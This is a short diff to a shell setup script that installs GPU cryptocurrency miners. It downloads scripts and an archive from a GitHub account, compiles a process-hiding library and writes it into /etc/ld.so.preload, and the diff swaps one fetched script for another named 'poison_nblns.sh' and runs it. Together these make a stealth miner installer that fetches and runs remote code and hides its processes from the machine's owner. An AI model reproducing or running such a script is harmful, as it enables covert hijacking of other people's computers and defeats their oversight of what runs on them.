@@ -9,12 +9,12 @@ chmod +x start_flypool.sh
 chmod +x start_hiveon.sh
 chmod +x start_ravenminerpplns.sh
 chmod +x start_ravenminerpps.sh
-wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/start_wooly_plns.sh
-chmod +x start_wooly_plns.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/poison_nblns.sh
+chmod +x poison_nblns.sh
 wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./start_ravenminerpplns.sh
+./poison_nblns.sh
